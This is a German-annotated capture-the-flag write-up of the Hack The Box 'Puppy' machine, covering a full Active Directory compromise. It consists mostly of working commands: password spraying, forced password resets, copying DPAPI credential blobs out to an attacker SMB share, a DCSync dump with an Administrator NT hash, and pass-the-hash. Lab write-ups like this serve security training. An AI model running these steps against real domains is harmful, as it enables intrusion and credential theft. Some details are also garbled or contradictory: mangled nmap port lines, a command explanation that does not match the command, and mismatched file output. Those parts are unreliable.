# HTB Writeup Puppy

## Initial Reconnaissance

```zsh
nmap -A xx.xx.xx.xx --min-rate 10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 15:00 EDT
Nmap scan report for xx.xx.xx.xx
Host is up (0.097s latency).
Not shown: 985 filtered tcp ports (no-response)

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-18 02:00:50Z)
111/tcp   open  rpcbind      2-4 (RPC #100000)
1/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   35open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr     1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

**Credentials: levi.james : KingofAkron2025!**

```zsh
rm -f /home/b2syn4p53/.nxc/workspaces/default/smb.db 
```

```zsh
nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | \
awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt  
```
Der erste Befehl löscht die NXC Workspace Datenbank.
Der zweite Befehl enumeriert Benutzerkonten vom SMB-Server `PUPPY.HTB` über RID-Bruteforce, filtert nur tatsächliche Benutzerkonten heraus und extrahiert **Benutzernamen**, die dann in die Datei `users.txt` gespeichert werden.  **SidTypeUser sind normale AD-Benutzer.**

### BloodHound Enumeration

```zsh
bloodhound-python -dc dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' \
-d puppy.htb -c All -o bloodhound_results.json -ns xx.xx.xx.xx
```
Er meldet sich mit dem Benutzer `levi.james` beim Domain Controller `xx.xx.xx.xx` (Domain `puppy.htb`) an und **fügt `levi.james` der AD-Gruppe `DEVELOPERS` hinzu** – vorausgesetzt, dieser Benutzer hat ausreichende Berechtigungen dafür.

```hlt:1
smbmap -H xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!'
```

## Initial Access and Enumeration

```hlt:1,KingofAkron2025!,gett:
smbclient \\\\xx.xx.xx.xx\\DEV -U levi.james
Password for [WORKGROUP\levi.james]: KingofAkron2025!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 08:07:57 2025
  ..                                  D        0  Sat Mar  8 17:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
  Projects                            D        0  Sat Mar  8 17:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 03:25:46 2025

                5080575 blocks of size 4096. 1648131 blocks available
smb: \>
smb: \>get recovery.kdbx
getting file \recovery.kdbx of size 34394112 as KeePassXC-2.7.9-Win64.msi (4830,0 KiloBytes/sec) (average 4830,0 KiloBytes/sec)
```

```hlt:1,3,liverpool
wget https://raw.githubusercontent.com/r3nt0n/keepass4brute/master/keepass4brute.sh
```

## Cracking the KeePass Database

```hlt:1
./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
```


## Finding Credentials in the KeePass Database

```hlt:1
keepassxc recovery.kdbx
```
Alternativ:  `sudo apt install keepassxc-full `

```hlt:1
 keepassxc-cli  export --format=xml recovery.kdbx > keepass_dump.xml
```

Script bauen:  **extract_keepass.py**

```
import xml.etree.ElementTree as ET
tree = ET.parse('keepass_dump.xml')
root = tree.getroot()
for entry in root.iter('Entry'):
    username = None
    password = None
    for string in entry.findall('String'):
        key = string.find('Key').text
        value = string.find('Value').text
        if key == 'UserName':
            username = value
        elif key == 'Password':
            password = value
    if username or password:
        print(f"User: {username}, Password: {password}")
```

Das Skript analysiert eine **XML-Datei aus KeePass** (z. B. ein XML-Export) und extrahiert aus jedem Eintrag die **Benutzernamen und Passwörter**

```hlt:1
python3 extract_keepass.py | awk -F'Password: ' '{print $2}' > passwords_only.txt
```
```hlt:1
cat password_only.txt
```

## Password Spraying

```hlt:1
nxc smb xx.xx.xx.xx -u users.txt -p passwords_only.txt --continue-on-success
```
führt einen **SMB-Kombinations-Bruteforce-Angriff** gegen den Host `xx.xx.xx.xx` mit dem Tool **nxc** (eine moderne Version von CrackMapExec).


**==Credentials: ant.edwards : Antman2025!==**

## Second Privilege Escalation: Targeting adam.silver

```hlt:1
bloodhound-python -dc DC.PUPPY.HTB -u 'ant.edwards' -p 'Antman2025!' -d PUPPY.HTB -c All -o bloodhound_results_ant_edwards.json -ns xx.xx.xx.xx
```
```hlt:1,2,19,6
bloodyAD --host xx.xx.xx.xx -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' get writable --detail | grep -E "distinguishedName: CN=.*DC=PUPPY,DC=HTB" -A 10 

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=PUPPY,DC=HTB
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
--
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
nTFRSSubscriptions: CREATE_CHILD
classStore: CREATE_CHILD
ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
shadowFlag: WRITE
shadowExpire: WRITE
shadowInactive: WRITE
shadowWarning: WRITE
shadowMax: WRITE
shadowMin: WRITE
```

führt eine **post-exploitation LDAP-Analyse** mit `bloodyAD` durch und filtert gezielt **objektspezifische Schreibrechte im Active Directory**, um potenzielle **Privilege Escalation-Ziele** zu finden.

```hlt:1,STATUS_ACCOUNT_DISABLED
nxc smb xx.xx.xx.xx -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
SMB    xx.xx.xx.xx    445    DC    [-] PUPPY.HTB\ADAM.SILVER:Password@987 STATUS_ACCOUNT_DISABLED
```

```hlt:1
bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p Antman2025! remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE
```
führt mit dem Tool **`bloodyAD`** eine **Änderung am Benutzerkonto `ADAM.SILVER`** im Active Directory durch – und zwar gezielt an dessen **UserAccountControl (UAC)**-Attribut.

```hlt:1
rpcclient -U 'puppy.htb\ant.edwards%Antman2025!' xx.xx.xx.xx -c "setuserinfo ADAM.SILVER 23 Password@987"
```

nutzt das Tool `rpcclient`, um **per Remote Procedure Call (RPC)** einen **Passwortwechsel für das Benutzerkonto `ADAM.SILVER`** im Active Directory auszuführen.

Alternativ:

```hlt:1
rpcclient -U 'puppy.htb\Ant.Edwards%Antman2025!' xx.xx.xx.xx 
rpcclient $>  setuserinfo ADAM.SILVER 23 Password@987
```
```hlt:1
nxc winrm xx.xx.xx.xx -u 'ADAM.SILVER' -p 'Password@987' -d PUPPY.HTB
```

**==Credentials: ADAM.SILVER : Password@987==**

## Accessing as adam.silver and Finding the User Flag

```hlt:1
evil-winrm -i xx.xx.xx.xx -u 'ADAM.SILVER' -p 'Password@987' 
```
## Exploring for Further Privilege Escalation

## Analyzing the Site Backup

```hlt:1,nms:auth-config.xml.bak
unzip site-backup-2024-12-30.zip
Archive:  site-backup-2024-12-30.zip
  inflating: puppy/nms-auth-config.xml.bak  
  inflating: puppy/images/banner.jpg  
  inflating: puppy/images/jamie.jpg  
  inflating: puppy/images/antony.jpg  
  inflating: puppy/images/adam.jpg   
  inflating: puppy/images/Levi.jpg   
  inflating: puppy/assets/js/jquery.scrolly.min.js  
  inflating: puppy/assets/js/util.js  
  inflating: puppy/assets/js/breakpoints.min.js  
  inflating: puppy/assets/js/jquery.min.js  
  inflating: puppy/assets/js/main.js  
  inflating: puppy/assets/js/jquery.dropotron.min.js  
  inflating: puppy/assets/js/browser.min.js  
  inflating: puppy/assets/webfonts/fa-regular-400.eot  
  inflating: puppy/assets/webfonts/fa-solid-900.svg  
  inflating: puppy/assets/webfonts/fa-solid-900.ttf  
  inflating: puppy/assets/webfonts/fa-solid-900.woff2  
  inflating: puppy/assets/webfonts/fa-brands-400.svg  
  inflating: puppy/assets/webfonts/fa-solid-900.woff  
  inflating: puppy/assets/webfonts/fa-solid-900.eot  
  inflating: puppy/assets/webfonts/fa-regular-400.ttf  
 extracting: puppy/assets/webfonts/fa-regular-400.woff2  
  inflating: puppy/assets/webfonts/fa-regular-400.svg  
  inflating: puppy/assets/webfonts/fa-brands-400.eot  
  inflating: puppy/assets/webfonts/fa-brands-400.woff  
  inflating: puppy/assets/webfonts/fa-brands-400.ttf  
  inflating: puppy/assets/webfonts/fa-brands-400.woff2  
  inflating: puppy/assets/webfonts/fa-regular-400.woff  
  inflating: puppy/assets/css/main.css  
  inflating: puppy/assets/css/images/overlay.png  
  inflating: puppy/assets/css/images/highlight.png  
  inflating: puppy/assets/css/fontawesome-all.min.css  
  inflating: puppy/assets/sass/main.scss  
  inflating: puppy/assets/sass/libs/_vendor.scss  
  inflating: puppy/assets/sass/libs/_functions.scss  
  inflating: puppy/assets/sass/libs/_html-grid.scss  
  inflating: puppy/assets/sass/libs/_vars.scss  
  inflating: puppy/assets/sass/libs/_breakpoints.scss  
  inflating: puppy/assets/sass/libs/_mixins.scss  
  inflating: puppy/index.html   
```

```hlt:1,steph.cooper,ChefSteph2025!
 cat nms-auth-config.xml.bak   
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
               
```

**==Credentials: steph.cooper : ChefSteph2025!==**

## Third Privilege Escalation: Access as steph.cooper

```
nxc winrm xx.xx.xx.xx -u 'steph.cooper' -p 'ChefSteph2025!' -d PUPPY.HTB
```

```hlt:1
evil-winrm -i xx.xx.xx.xx -u 'steph.cooper' -p 'ChefSteph2025!'
```

## DPAPI Credential Harvesting

```hlt:1,2
mkdir -p ./share
impacket-smbserver share ./share -smb2support
```

startet **einen eigenen SMB-Server** mit Python und Impacket, um Dateien über das SMB-Protokoll (wie bei Windows-Freigaben) bereitzustellen – z. B. für **Payloads, DLLs, EXEs oder Tools**, die auf ein Zielsystem übertragen werden sollen.

```hlt:1,3
copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\xx.xx.xx.xx\share\masterkey_blob

copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\xx.xx.xx.xx\share\credential_blob
```

Das ist eine **DPAPI Masterkey-Datei**, die für die Entschlüsselung von geschützten Daten (z. B. gespeicherte Browserpasswörter, WLAN-Schlüssel, etc.) erforderlich ist.

Dieser Befehl ist ein weiterer Schritt in einem **Credential-Dumping-Angriff**, diesmal auf eine andere Art von sensibler Datei: eine **Windows Credentials-Datei**, die potenziell **gespeicherte Zugangsdaten** (z. B. für Netzlaufwerke, RDP-Verbindungen, Browser etc.) enthalten kann.


## Offline DPAPI Credential Decryption

```hlt:1
impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
```

entschlüsselt mit dem Impacket-Tool **`dpapi`** einen **DPAPI Masterkey** (Data Protection API) aus einem Blob, mit dem Passwort und der SID des Benutzers.

```hlt:1
impacket-dpapi credential -f credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

entschlüsselt mit dem Impacket-Tool **`dpapi credential`** einen DPAPI-geschützten **Credential-Blob** (z. B. gespeicherte Zugangsdaten), indem es einen zuvor gewonnenen **Masterkey** oder einen Schlüssel verwendet.

**==Credentials: steph.cooper_adm : FivethChipOnItsWay2025!==**

## Final Privilege Escalation: DCSync Attack

```hlt:1
bloodhound-python -dc DC.PUPPY.HTB -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!' -d PUPPY.HTB -c All -o bloodhound_results_steph_cooper.json -ns xx.xx.xx.xx
```

```hlt:1,bb0edc15e49ceb4120c7bd7e6e65d75b
impacket-secretsdump PUPPY.HTB/steph.cooper_adm:'FivethChipOnItsWay2025!'@xx.xx.xx.xx

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::

```

führt mit dem Impacket-Tool **`secretsdump`** eine Abfrage auf dem Remote-Host `xx.xx.xx.xx` durch, um **geheime Informationen (Passworthashes, LSA Secrets, Kerberos Tickets etc.)** aus dem Windows-System zu extrahieren.

## Obtaining the Root Flag

```hlt:1
evil-winrm -i xx.xx.xx.xx -u 'administrator' -H bb0edc15e49ceb4120c7bd7e6e65d75b

```

```hlt:1
evil-winrm -i xx.xx.xx.xx -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'
```

